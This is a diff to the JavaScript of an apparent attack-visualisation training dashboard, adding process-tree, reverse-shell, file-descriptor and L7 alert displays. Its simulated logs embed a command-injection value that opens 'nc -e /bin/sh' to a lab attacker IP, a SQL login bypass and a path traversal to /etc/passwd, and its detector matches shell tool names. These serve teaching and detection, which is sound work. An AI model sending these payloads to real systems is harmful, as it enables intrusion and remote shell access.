@@ -38,6 +38,57 @@ const state = {
     },
     syn_history: Array(16).fill(0),
   },
+  osL7State: {
+    pstree: [
+      {
+        pid: 1,
+        name: 'python3',
+        cmd: 'python3 /app/target-entrypoint.py',
+        user: 'root',
+        suspicious: false,
+        children: [
+          { pid: 18, name: 'sshd', cmd: '/usr/sbin/sshd -D -e', user: 'root', suspicious: false },
+          {
+            pid: 24,
+            name: 'node',
+            cmd: 'node dist/main.js (Target Server :8000)',
+            user: 'node',
+            suspicious: false,
+            children: [
+              { pid: 31, name: 'sqlite3-worker', cmd: 'sqlite3 /data/target.sqlite', user: 'node', suspicious: false },
+            ],
+          },
+        ],
+      },
+    ],
+    suspicious_processes: [],
+    reverse_shell: {
+      active: false,
+      spawned_at: null,
+      shell_cmd: null,
+      server_ip: '172.20.0.20',
+      hacker_ip: '172.20.0.66',
+      hacker_port: 4444,
+      pid: null,
+    },
+    fd_metrics: {
+      open_fds: 42,
+      max_fds: 1024,
+      peak_fds: 42,
+      status: 'NORMAL',
+      suspicious_files: [],
+      process_count: 4,
+    },
+    l7_alerts: [],
+    l7_counters: {
+      sqli_count: 0,
+      brute_force_count: 0,
+      cmd_injection_count: 0,
+      path_traversal_count: 0,
+      heavy_dos_count: 0,
+    },
+  },
+  bruteForceCounter: 0,
 };
 
 // ==========================================
@@ -46,9 +97,11 @@ const state = {
 document.addEventListener('DOMContentLoaded', () => {
   updateDefenseUI(null);
   updateNetworkStateUI(state.networkState);
+  updateOsL7StateUI(state.osL7State);
   initSocket();
   initCanvas();
   initEventListeners();
+  startReverseShellBeaconLoop();
 });
 
 function initSocket() {
@@ -93,13 +146,19 @@ function initSocket() {
     if (data.network_state) {
       updateNetworkStateUI(data.network_state, data.metrics);
     }
+    if (data.os_l7_state) {
+      updateOsL7StateUI(data.os_l7_state);
+    }
   });
 
   // Nhận bản tin Telemetry thời gian thực từ Target App
   state.socket.on('GOD_VIEW_UPDATE', (payload) => {
-    const { log, metrics, network_state, defense_l3_state } = payload;
+    const { log, metrics, network_state, os_l7_state, defense_l3_state } = payload;
     if (network_state) {
       updateNetworkStateUI(network_state, metrics);
+    }
+    if (os_l7_state) {
+      updateOsL7StateUI(os_l7_state);
     }
     handleIncomingTelemetry(log);
 
@@ -111,6 +170,12 @@ function initSocket() {
   state.socket.on('NETWORK_STATE_UPDATE', (payload) => {
     if (payload.metrics) updateMetricsUI(payload.metrics);
     if (payload.network_state) updateNetworkStateUI(payload.network_state, payload.metrics);
+  });
+
+  // Nhận cập nhật trạng thái HĐH & Tầng L7 trực tiếp (W4-T1: pstree, reverse shell, lsof, SQLi/Brute-force)
+  state.socket.on('OS_L7_STATE_UPDATE', (payload) => {
+    if (payload.metrics) updateMetricsUI(payload.metrics);
+    if (payload.os_l7_state) updateOsL7StateUI(payload.os_l7_state);
   });
 
   // Nhận sự kiện đồng bộ khi khiên phòng thủ thay đổi
@@ -132,8 +197,10 @@ function initSocket() {
     state.logs = [];
     state.attackEvents = [];
     state.synPeak = 0;
+    state.bruteForceCounter = 0;
     if (payload && payload.metrics) updateMetricsUI(payload.metrics);
     if (payload && payload.network_state) updateNetworkStateUI(payload.network_state, payload.metrics);
+    if (payload && payload.os_l7_state) updateOsL7StateUI(payload.os_l7_state);
     renderAttackEvents();
     renderTable();
     updateBufferCount();
@@ -459,6 +526,235 @@ function renderRstMonitor(rst) {
 }
 
 // ==========================================
+// 3C. W4-T1: OS & APPLICATION L7 VISUALIZATION (PSTREE, REVERSE SHELL, LSOF FD GAUGE, SQLI/BRUTE-FORCE)
+// ==========================================
+function updateOsL7StateUI(osState) {
+  if (!osState) return;
+  state.osL7State = {
+    ...state.osL7State,
+    ...osState,
+  };
+
+  const revShell = state.osL7State.reverse_shell || {};
+  const revBadge = document.getElementById('revshell-badge-indicator');
+  const serverNode = document.getElementById('node-server');
+  const serverStatus = document.getElementById('server-status');
+
+  if (revShell.active) {
+    if (revBadge) revBadge.classList.remove('hidden');
+    if (serverNode) serverNode.classList.add('compromised');
+    if (serverStatus) serverStatus.textContent = `🐚 REVERSE SHELL -> ${revShell.hacker_ip || '172.20.0.66'}:${revShell.hacker_port || 4444}`;
+  } else {
+    if (revBadge) revBadge.classList.add('hidden');
+    if (serverNode) serverNode.classList.remove('compromised');
+    if (serverStatus) serverStatus.textContent = 'ONLINE (PORT 8000)';
+  }
+
+  renderProcessTree(state.osL7State.pstree, revShell);
+  renderFdGauge(state.osL7State.fd_metrics);
+  renderL7AlertsTable(state.osL7State.l7_alerts, state.osL7State.l7_counters);
+}
+
+function renderProcessTree(pstree, revShell) {
+  const container = document.getElementById('pstree-view');
+  const card = document.getElementById('pstree-card');
+  const statusBadge = document.getElementById('pstree-status-badge');
+  const countBadge = document.getElementById('pstree-proc-count-badge');
+  const alertBox = document.getElementById('revshell-alert-box');
+  const cmdEl = document.getElementById('revshell-cmd-value');
+  if (!container) return;
+
+  const nodes = Array.isArray(pstree) ? pstree : [];
+  let totalProcs = 0;
+  let hasMalicious = Boolean(revShell && revShell.active);
+
+  function buildTreeHtml(list, isRoot = false) {
+    const ulClass = isRoot ? 'pstree-root' : 'pstree-branch';
+    let html = `<ul class="${ulClass}">`;
+    for (const proc of list) {
+      totalProcs += 1;
+      const isMal = Boolean(
+        proc.suspicious ||
+          proc.name === '/bin/sh' ||
+          proc.name === 'sh' ||
+          proc.name === 'nc' ||
+          proc.name === 'bash' ||
+          (typeof proc.cmd === 'string' && (proc.cmd.includes('/bin/sh') || proc.cmd.includes('nc -e'))),
+      );
+      if (isMal) hasMalicious = true;
+
+      const rowClass = isMal ? 'pstree-node-row pstree-node-malicious' : 'pstree-node-row';
+      const icon = isMal ? '🚨' : proc.pid === 1 ? '⚙️' : '🔹';
+      html += `<li class="pstree-item">`;
+      html += `<div class="${rowClass}">`;
+      html += `<span>${icon}</span>`;
+      html += `<span class="pstree-pid">[PID ${escapeHtml(proc.pid)}]</span>`;
+      html += `<span class="pstree-user">(${escapeHtml(proc.user || 'node')})</span>`;
+      html += `<code class="pstree-cmd">${escapeHtml(proc.cmd || proc.name)}</code>`;
+      html += `</div>`;
+      if (Array.isArray(proc.children) && proc.children.length > 0) {
+        html += buildTreeHtml(proc.children, false);
+      }
+      html += `</li>`;
+    }
+    html += `</ul>`;
+    return html;
+  }
+
+  container.innerHTML = buildTreeHtml(nodes, true);
+  if (countBadge) countBadge.textContent = `${totalProcs} procs`;
+
+  if (hasMalicious) {
+    card.classList.add('card-alert-red');
+    statusBadge.className = 'badge badge-attack';
+    statusBadge.textContent = '🚨 SHELL SPAWNED (/bin/sh)';
+    alertBox.classList.remove('hidden');
+    if (cmdEl && revShell && revShell.shell_cmd) {
+      cmdEl.textContent = revShell.shell_cmd;
+    }
+  } else {
+    card.classList.remove('card-alert-red');
+    statusBadge.className = 'badge badge-normal';
+    statusBadge.textContent = 'OS: CLEAN';
+    alertBox.classList.add('hidden');
+  }
+}
+
+function renderFdGauge(fdMetrics) {
+  if (!fdMetrics) return;
+  const openFds = typeof fdMetrics.open_fds === 'number' ? fdMetrics.open_fds : 42;
+  const maxFds = typeof fdMetrics.max_fds === 'number' && fdMetrics.max_fds > 0 ? fdMetrics.max_fds : 1024;
+  const peakFds = typeof fdMetrics.peak_fds === 'number' ? fdMetrics.peak_fds : openFds;
+  const procCount = typeof fdMetrics.process_count === 'number' ? fdMetrics.process_count : 4;
+
+  const ratio = Math.min(1, Math.max(0, openFds / maxFds));
+  const pct = Math.round(ratio * 100);
+
+  // Arc length of semicircle R=55 is PI * 55 ≈ 172.8
+  const arcTotal = 173;
+  const dashOffset = Math.round(arcTotal * (1 - ratio));
+
+  const arcEl = document.getElementById('fd-arc-fill');
+  const pctEl = document.getElementById('fd-gauge-percent');
+  const openEl = document.getElementById('fd-open-count');
+  const maxEl = document.getElementById('fd-max-limit');
+  const statOpen = document.getElementById('fd-stat-open');
+  const statMax = document.getElementById('fd-stat-max');
+  const statPeak = document.getElementById('fd-stat-peak');
+  const statProcs = document.getElementById('fd-stat-procs');
+  const linearFill = document.getElementById('fd-linear-fill');
+  const statusBadge = document.getElementById('fd-status-badge');
+  const card = document.getElementById('fd-gauge-card');
+  const filesListEl = document.getElementById('fd-files-list');
+
+  if (arcEl) arcEl.setAttribute('stroke-dashoffset', String(dashOffset));
+  if (pctEl) pctEl.textContent = `${pct}%`;
+  if (openEl) openEl.textContent = String(openFds);
+  if (maxEl) maxEl.textContent = String(maxFds);
+  if (statOpen) statOpen.textContent = String(openFds);
+  if (statMax) statMax.textContent = String(maxFds);
+  if (statPeak) statPeak.textContent = String(peakFds);
+  if (statProcs) statProcs.textContent = String(procCount);
+  if (linearFill) linearFill.style.width = `${Math.max(4, pct)}%`;
+
+  if (pct >= 85 || fdMetrics.status === 'EXHAUSTED') {
+    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill fd-critical');
+    if (linearFill) linearFill.className = 'meter-fill fill-red';
+    if (statusBadge) {
+      statusBadge.className = 'badge badge-attack';
+      statusBadge.textContent = '🔥 EMFILE: FD EXHAUSTED';
+    }
+    if (card) card.classList.add('card-alert-red');
+  } else if (pct >= 55 || fdMetrics.status === 'WARNING') {
+    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill fd-warn');
+    if (linearFill) linearFill.className = 'meter-fill fill-yellow';
+    if (statusBadge) {
+      statusBadge.className = 'badge badge-mitm';
+      statusBadge.textContent = '⚠️ FD: ELEVATED';
+    }
+    if (card) card.classList.remove('card-alert-red');
+  } else {
+    if (arcEl) arcEl.setAttribute('class', 'fd-arc-fill');
+    if (linearFill) linearFill.className = 'meter-fill fill-green';
+    if (statusBadge) {
+      statusBadge.className = 'badge badge-normal';
+      statusBadge.textContent = 'FD: NORMAL';
+    }
+    if (card) card.classList.remove('card-alert-red');
+  }
+
+  if (filesListEl) {
+    const files = Array.isArray(fdMetrics.suspicious_files) ? fdMetrics.suspicious_files : [];
+    if (files.length > 0) {
+      filesListEl.textContent = files.join(' | ');
+      filesListEl.style.color = '#ff4d6d';
+    } else {
+      filesListEl.textContent = 'Standard sockets & SQLite WAL descriptors healthy';
+      filesListEl.style.color = 'var(--text-main)';
+    }
+  }
+}
+
+function renderL7AlertsTable(alerts, counters) {
+  const listEl = document.getElementById('l7-alerts-list');
+  const totalBadge = document.getElementById('l7-alert-total-badge');
+  const card = document.getElementById('l7-alerts-card');
+  const cntSqli = document.getElementById('cnt-sqli');
+  const cntBf = document.getElementById('cnt-bruteforce');
+  const cntCmd = document.getElementById('cnt-cmd');
+  const cntPath = document.getElementById('cnt-traversal');
+  if (!listEl) return;
+
+  const c = counters || {};
+  if (cntSqli) cntSqli.textContent = String(c.sqli_count || 0);
+  if (cntBf) cntBf.textContent = String(c.brute_force_count || 0);
+  if (cntCmd) cntCmd.textContent = String(c.cmd_injection_count || 0);
+  if (cntPath) cntPath.textContent = String(c.path_traversal_count || 0);
+
+  const list = Array.isArray(alerts) ? alerts : [];
+  if (totalBadge) {
+    totalBadge.textContent = `${list.length} alerts`;
+    totalBadge.className = list.length > 0 ? 'badge badge-attack' : 'badge badge-normal';
+  }
+  if (card) {
+    card.classList.toggle('card-alert-red', list.some((a) => !a.blocked));
+  }
+
+  if (list.length === 0) {
+    listEl.innerHTML = `
+      <div class="sniffer-empty">
+        Chưa phát hiện cảnh báo Tầng Ứng dụng (L7). Khi có đòn tấn công <strong>SQL Injection</strong>, <strong>Brute-force Login</strong>, <strong>OS Command Injection</strong> hoặc <strong>Path Traversal</strong>, chi tiết payload sẽ hiển thị tại đây.
+      </div>
+    `;
+    return;
+  }
+
+  listEl.innerHTML = '';
+  for (const item of list.slice(-15).reverse()) {
+    const div = document.createElement('div');
+    div.className = item.blocked ? 'l7-alert-item alert-blocked' : 'l7-alert-item';
+    const timeStr = item.timestamp ? new Date(item.timestamp).toTimeString().split(' ')[0] : '--:--:--';
+    const stateLabel = item.blocked
+      ? `<span class="badge badge-shield">🛡️ BLOCKED (${escapeHtml(item.status_code)})</span>`
+      : `<span class="badge badge-attack">💥 EXPLOITED (${escapeHtml(item.status_code)})</span>`;
+
+    div.innerHTML = `
+      <div class="l7-alert-top">
+        <span class="l7-alert-cat">[${escapeHtml(timeStr)}] ${escapeHtml(item.category)}</span>
+        ${stateLabel}
+      </div>
+      <div class="l7-alert-top">
+        <span>SRC: <code>${escapeHtml(item.client_ip)}</code> &rarr; <strong>${escapeHtml(item.endpoint)}</strong></span>
+      </div>
+      <div class="l7-alert-payload" title="${escapeHtml(item.payload_preview)}">
+        Payload: <code>${escapeHtml(item.payload_preview)}</code>
+      </div>
+    `;
+    listEl.appendChild(div);
+  }
+}
+
+// ==========================================
 // 4. CANVAS TOPOLOGY PARTICLE ENGINE
 // ==========================================
 let canvas, ctx;
@@ -605,6 +901,40 @@ function spawnPacketParticles(log) {
     return;
   }
 
+  if (log.attack_tag === 'COMMAND_INJECTION' || log.attack_tag === 'REVERSE_SHELL') {
+    const isBlocked = Boolean(state.defenseL3Active && log.status_code >= 400);
+    // 1. Hacker gửi payload Command Injection lên Server
+    for (let i = 0; i < 8; i++) {
+      particles.push({
+        x: hackerPos.x,
+        y: hackerPos.y,
+        targetX: serverPos.x,
+        targetY: serverPos.y,
+        startX: hackerPos.x,
+        startY: hackerPos.y,
+        progress: 0,
+        speed: 0.018 + Math.random() * 0.012,
+        type: 'ATTACK',
+        color: '#ff005f',
+        size: 3.5 + Math.random() * 2,
+        tag: log.attack_tag,
+        spread: (Math.random() - 0.5) * 28,
+      });
+    }
+    // 2. Nếu không bị Khiên L3 chặn -> Server mở kết nối Reverse Shell NGƯỢC về Hacker (Server -> Hacker)
+    if (!isBlocked) {
+      spawnReverseShellOutboundParticles(serverPos, hackerPos, 14);
+      floatingLabels.push({
+        x: (serverPos.x + hackerPos.x) / 2 - 55,
+        y: (serverPos.y + hackerPos.y) / 2 - 15,
+        text: '🐚 REVERSE SHELL: /bin/sh -> HACKER:4444',
+        alpha: 1,
+        color: '#ff005f',
+      });
+    }
+    return;
+  }
+
   if (isAttack) {
     // Kẻ tấn công bắn hạt đỏ/tím sang Server
     const isSynFlood = log.attack_tag === 'SYN_FLOOD';
@@ -694,6 +1024,52 @@ function spawnMitmBentParticles(clientPos, hackerPos, serverPos) {
       spread: (Math.random() - 0.5) * 14,
     });
   }
+}
+
+/**
+ * W4-T1: Tạo luồng hạt Reverse Shell đi NGƯỢC từ Target Server (.20) về Hacker (.66)
+ */
+function spawnReverseShellOutboundParticles(serverPos, hackerPos, count = 6) {
+  for (let i = 0; i < count; i++) {
+    particles.push({
+      x: serverPos.x,
+      y: serverPos.y,
+      startX: serverPos.x,
+      startY: serverPos.y,
+      targetX: hackerPos.x,
+      targetY: hackerPos.y,
+      progress: 0,
+      speed: 0.015 + Math.random() * 0.012,
+      type: 'REVERSE_SHELL',
+      color: i % 2 === 0 ? '#ff005f' : '#ffd700',
+      size: 3.5 + Math.random() * 1.8,
+      tag: 'REVERSE_SHELL',
+      spread: (Math.random() - 0.5) * 22,
+    });
+  }
+}
+
+function startReverseShellBeaconLoop() {
+  setInterval(() => {
+    if (!state.osL7State || !state.osL7State.reverse_shell || !state.osL7State.reverse_shell.active) return;
+    const serverNode = document.getElementById('node-server');
+    const hackerNode = document.getElementById('node-hacker');
+    const wrapper = document.getElementById('canvas-wrapper');
+    if (!serverNode || !hackerNode || !wrapper) return;
+
+    const wrapRect = wrapper.getBoundingClientRect();
+    const sR = serverNode.getBoundingClientRect();
+    const hR = hackerNode.getBoundingClientRect();
+    const serverPos = {
+      x: sR.left - wrapRect.left + sR.width / 2,
+      y: sR.top - wrapRect.top + sR.height / 2,
+    };
+    const hackerPos = {
+      x: hR.left - wrapRect.left + hR.width / 2,
+      y: hR.top - wrapRect.top + hR.height / 2,
+    };
+    spawnReverseShellOutboundParticles(serverPos, hackerPos, 4);
+  }, 1400);
 }
 
 function renderCanvasLoop() {
@@ -791,6 +1167,43 @@ function drawNetworkLinks() {
     ctx.quadraticCurveTo((hX + sX) / 2, (hY + sY) / 2, sX, sY);
     ctx.stroke();
     ctx.setLineDash([]);
+  }
+
+  // W4-T1: Vẽ đường kết nối Reverse Shell NGƯỢC từ Target Server (.20) về Hacker (.66)
+  if (state.osL7State && state.osL7State.reverse_shell && state.osL7State.reverse_shell.active) {
+    ctx.save();
+    ctx.beginPath();
+    ctx.strokeStyle = '#ff005f';
+    ctx.lineWidth = 3.2;
+    ctx.setLineDash([10, 6]);
+    ctx.shadowColor = '#ff005f';
+    ctx.shadowBlur = 15;
+    const ctrlX = (sX + hX) / 2 + 45;
+    const ctrlY = (sY + hY) / 2 + 28;
+    ctx.moveTo(sX, sY);
+    ctx.quadraticCurveTo(ctrlX, ctrlY, hX, hY);
+    ctx.stroke();
+
+    // Vẽ mũi tên chỉ chiều từ Server -> Hacker tại điểm giữa đường cong
+    const midX = 0.25 * sX + 0.5 * ctrlX + 0.25 * hX;
+    const midY = 0.25 * sY + 0.5 * ctrlY + 0.25 * hY;
+    const angle = Math.atan2(hY - sY, hX - sX);
+    ctx.setLineDash([]);
+    ctx.fillStyle = '#ff005f';
+    ctx.beginPath();
+    ctx.moveTo(midX + Math.cos(angle) * 9, midY + Math.sin(angle) * 9);
+    ctx.lineTo(midX + Math.cos(angle + 2.5) * 8, midY + Math.sin(angle + 2.5) * 8);
+    ctx.lineTo(midX + Math.cos(angle - 2.5) * 8, midY + Math.sin(angle - 2.5) * 8);
+    ctx.closePath();
+    ctx.fill();
+
+    // Nhãn đường kết nối Reverse Shell ngược
+    ctx.font = 'bold 11px Orbitron';
+    ctx.fillStyle = '#ffb3d1';
+    ctx.textAlign = 'center';
+    const port = state.osL7State.reverse_shell.hacker_port || 4444;
+    ctx.fillText(`🐚 REVERSE SHELL (SERVER ➔ HACKER:${port})`, midX + 35, midY + 18);
+    ctx.restore();
   }
 }
 
@@ -897,7 +1310,12 @@ function spawnShieldDeflection(x, y, customColor = '#00f0ff', customText = '🛡
 function triggerServerCompromisedVisual() {
   const server = document.getElementById('node-server');
   server.classList.add('compromised');
-  setTimeout(() => server.classList.remove('compromised'), 400);
+  setTimeout(() => {
+    const revActive = Boolean(state.osL7State && state.osL7State.reverse_shell && state.osL7State.reverse_shell.active);
+    if (!revActive) {
+      server.classList.remove('compromised');
+    }
+  }, 400);
 }
 
 function updateAndDrawSparks() {
@@ -912,11 +1330,13 @@ function updateAndDrawSparks() {
       continue;
     }
 
+    const col = s.color || '#00f0ff';
     ctx.save();
+    ctx.globalAlpha = Math.max(0, s.alpha);
     ctx.beginPath();
     ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
-    ctx.fillStyle = `rgba(0, 240, 255, ${s.alpha})`;
-    ctx.shadowColor = '#00f0ff';
+    ctx.fillStyle = col;
+    ctx.shadowColor = col;
     ctx.shadowBlur = 8;
     ctx.fill();
     ctx.restore();
@@ -934,10 +1354,12 @@ function updateAndDrawFloatingLabels() {
       continue;
     }
 
+    const col = l.color || '#00f0ff';
     ctx.save();
+    ctx.globalAlpha = Math.max(0, l.alpha);
     ctx.font = 'bold 11px Orbitron';
-    ctx.fillStyle = `rgba(0, 240, 255, ${l.alpha})`;
-    ctx.shadowColor = '#00f0ff';
+    ctx.fillStyle = col;
+    ctx.shadowColor = col;
     ctx.shadowBlur = 8;
     ctx.fillText(l.text, l.x, l.y);
     ctx.restore();
@@ -1122,7 +1544,51 @@ function initEventListeners() {
   document.getElementById('btn-demo-rst').addEventListener('click', () => simulateTraffic('rst-inject'));
   document.getElementById('btn-demo-clean-arp').addEventListener('click', () => restoreCleanArp());
   document.getElementById('btn-demo-sqli').addEventListener('click', () => simulateTraffic('sqli'));
+  document.getElementById('btn-demo-bruteforce').addEventListener('click', () => simulateTraffic('brute-force'));
+  document.getElementById('btn-demo-revshell').addEventListener('click', () => simulateTraffic('reverse-shell'));
+  document.getElementById('btn-demo-fd-exhaust').addEventListener('click', () => simulateTraffic('fd-exhaust'));
+  document.getElementById('btn-demo-traversal').addEventListener('click', () => simulateTraffic('path-traversal'));
   document.getElementById('btn-demo-dos').addEventListener('click', () => simulateTraffic('dos'));
+  document.getElementById('btn-demo-clean-os').addEventListener('click', () => restoreCleanOs());
+}
+
+async function restoreCleanOs() {
+  try {
+    await fetch('/api/telemetry/os', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'reset_os' }),
+    });
+  } catch {
+    updateOsL7StateUI({
+      ...state.osL7State,
+      pstree: [
+        {
+          pid: 1,
+          name: 'python3',
+          cmd: 'python3 /app/target-entrypoint.py',
+          user: 'root',
+          suspicious: false,
+          children: [
+            { pid: 18, name: 'sshd', cmd: '/usr/sbin/sshd -D -e', user: 'root', suspicious: false },
+            {
+              pid: 24,
+              name: 'node',
+              cmd: 'node dist/main.js (Target Server :8000)',
+              user: 'node',
+              suspicious: false,
+              children: [
+                { pid: 31, name: 'sqlite3-worker', cmd: 'sqlite3 /data/target.sqlite', user: 'node', suspicious: false },
+              ],
+            },
+          ],
+        },
+      ],
+      suspicious_processes: [],
+      reverse_shell: { ...state.osL7State.reverse_shell, active: false, shell_cmd: null, pid: null },
+      fd_metrics: { ...state.osL7State.fd_metrics, open_fds: 42, peak_fds: 42, status: 'NORMAL', suspicious_files: [], process_count: 4 },
+    });
+  }
 }
 
 async function restoreCleanArp() {
@@ -1282,17 +1748,88 @@ async function simulateTraffic(type) {
     logPayload = {
       timestamp: new Date().toISOString(),
       method: 'POST',
-      endpoint: '/api/login',
+      endpoint: '/api/auth/login',
       status_code: state.defenseL3Active ? 401 : 200,
       response_time: Math.floor(Math.random() * 25) + 8,
-      client_ip: '192.168.1.200',
+      client_ip: '172.20.0.66',
       payload_summary: {
-        body_preview: { username: "admin' --", password: '******' },
-        detected_patterns: ['SQL_INJECTION_PATTERN'],
+        body_preview: { username: "admin' OR '1'='1' --", password: '******' },
+        detected_patterns: ['SQL_INJECTION_AUTH_BYPASS'],
       },
       attack_tag: 'SQL_INJECTION',
       is_suspicious: true,
       defense_action: state.defenseL3Active ? 'sanitized' : 'allowed',
+    };
+  } else if (type === 'brute-force') {
+    state.bruteForceCounter += 1;
+    logPayload = {
+      timestamp: new Date().toISOString(),
+      method: 'POST',
+      endpoint: '/api/auth/login',
+      status_code: state.defenseL3Active ? 429 : 401,
+      response_time: Math.floor(Math.random() * 14) + 6,
+      client_ip: '172.20.0.66',
+      payload_summary: {
+        body_preview: { username: 'admin', password: `rockyou_pass_${state.bruteForceCounter}` },
+        attempts_count: state.bruteForceCounter,
+        rate_rps: 1,
+        detected_patterns: ['LOW_RATE_BRUTE_FORCE_1RPS'],
+      },
+      attack_tag: 'BRUTE_FORCE',
+      is_suspicious: true,
+      defense_action: state.defenseL3Active ? 'rate_limited' : 'allowed',
+    };
+  } else if (type === 'reverse-shell') {
+    const shellCmd = 'nc -e /bin/sh 172.20.0.66 4444';
+    logPayload = {
+      timestamp: new Date().toISOString(),
+      method: 'GET',
+      endpoint: `/api/system/network-ping?host=127.0.0.1;${encodeURIComponent(shellCmd)}`,
+      status_code: state.defenseL3Active ? 400 : 200,
+      response_time: Math.floor(Math.random() * 40) + 18,
+      client_ip: '172.20.0.66',
+      payload_summary: {
+        query: { host: `127.0.0.1; ${shellCmd}` },
+        shell_cmd: shellCmd,
+        detected_patterns: ['OS_COMMAND_INJECTION', 'REVERSE_SHELL_SPAWN'],
+      },
+      attack_tag: 'COMMAND_INJECTION',
+      is_suspicious: true,
+      defense_action: state.defenseL3Active ? 'blocked' : 'allowed',
+    };
+  } else if (type === 'fd-exhaust') {
+    logPayload = {
+      timestamp: new Date().toISOString(),
+      method: 'POST',
+      endpoint: '/OS/fd-exhaustion (ulimit/lsof saturation & fork bomb)',
+      status_code: 503,
+      response_time: 310,
+      client_ip: '172.20.0.66',
+      payload_summary: {
+        open_fds: 968,
+        max_fds: 1024,
+        detected_patterns: ['EMFILE_TOO_MANY_OPEN_FILES', 'FD_TABLE_EXHAUSTION'],
+      },
+      attack_tag: 'FD_EXHAUSTION',
+      is_suspicious: true,
+      defense_action: 'monitored',
+    };
+  } else if (type === 'path-traversal') {
+    logPayload = {
+      timestamp: new Date().toISOString(),
+      method: 'GET',
+      endpoint: '/api/files/download?name=../../../../etc/passwd',
+      status_code: state.defenseL3Active ? 400 : 200,
+      response_time: Math.floor(Math.random() * 20) + 7,
+      client_ip: '172.20.0.66',
+      payload_summary: {
+        query: { name: '../../../../etc/passwd' },
+        target_file: '/etc/passwd',
+        detected_patterns: ['DOT_DOT_SLASH_PATH_TRAVERSAL'],
+      },
+      attack_tag: 'PATH_TRAVERSAL',
+      is_suspicious: true,
+      defense_action: state.defenseL3Active ? 'blocked' : 'allowed',
     };
   } else if (type === 'dos') {
     logPayload = {
